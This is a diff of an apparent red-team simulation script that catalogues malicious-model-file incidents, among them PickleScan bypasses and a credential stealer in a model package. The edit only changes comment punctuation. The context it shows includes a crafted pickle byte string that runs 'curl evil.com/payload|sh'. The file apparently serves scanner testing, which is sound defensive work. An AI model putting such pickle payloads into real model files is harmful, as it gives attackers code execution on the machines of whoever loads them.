@@ -110,7 +110,7 @@ subprocess.Popen(
 """
 
 # ═══════════════════════════════════════════════════════════════════════
-# INCIDENT 2: CVE-2026-4372 — HuggingFace Transformers RCE
+# INCIDENT 2: CVE-2026-4372  --  HuggingFace Transformers RCE
 # Technique: trust_remote_code loads attacker-controlled Python
 # ═══════════════════════════════════════════════════════════════════════
 
@@ -160,7 +160,7 @@ except Exception:
 """
 
 # ═══════════════════════════════════════════════════════════════════════
-# INCIDENT 4: JFrog PickleScan Bypass #1 — Corrupted pickle
+# INCIDENT 4: JFrog PickleScan Bypass #1  --  Corrupted pickle
 # Technique: Malware executes before pickle fully deserializes
 # ═══════════════════════════════════════════════════════════════════════
 
@@ -172,11 +172,11 @@ ATTACK_4_PICKLE_CORRUPTED = (
     b"\x8c\x19curl evil.com/payload|sh"  # argument
     b"\x85"  # TUPLE1
     b"R"  # REDUCE
-    b"\xff\xff\xff"  # CORRUPTION — no STOP opcode
+    b"\xff\xff\xff"  # CORRUPTION  --  no STOP opcode
 )
 
 # ═══════════════════════════════════════════════════════════════════════
-# INCIDENT 5: JFrog PickleScan Bypass #2 — __reduce_ex__ gadget
+# INCIDENT 5: JFrog PickleScan Bypass #2  --  __reduce_ex__ gadget
 # Technique: Uses protocol-5 BYTEARRAY8 to hide payload
 # ═══════════════════════════════════════════════════════════════════════
 
@@ -187,7 +187,7 @@ ATTACK_5_PICKLE_REDUCE_EX = (
 )
 
 # ═══════════════════════════════════════════════════════════════════════
-# INCIDENT 6: Sonatype PickleScan Bypass — exec via copyreg
+# INCIDENT 6: Sonatype PickleScan Bypass  --  exec via copyreg
 # ═══════════════════════════════════════════════════════════════════════
 
 ATTACK_6_PICKLE_COPYREG = (
@@ -211,7 +211,7 @@ model = AutoModelForCausalLM.from_pretrained(
 """
 
 # ═══════════════════════════════════════════════════════════════════════
-# INCIDENT 8: Acronis TRU — Credential stealer in model __init__
+# INCIDENT 8: Acronis TRU  --  Credential stealer in model __init__
 # Technique: Model package __init__.py steals browser cookies
 # ═══════════════════════════════════════════════════════════════════════
 
@@ -453,7 +453,7 @@ def run_simulation():
 
 if __name__ == "__main__":
     print("=" * 70)
-    print("  RED TEAM ATTACK SIMULATION — REAL-WORLD 2025-2026 INCIDENTS")
+    print("  RED TEAM ATTACK SIMULATION  --  REAL-WORLD 2025-2026 INCIDENTS")
     print("=" * 70)
     print()
 
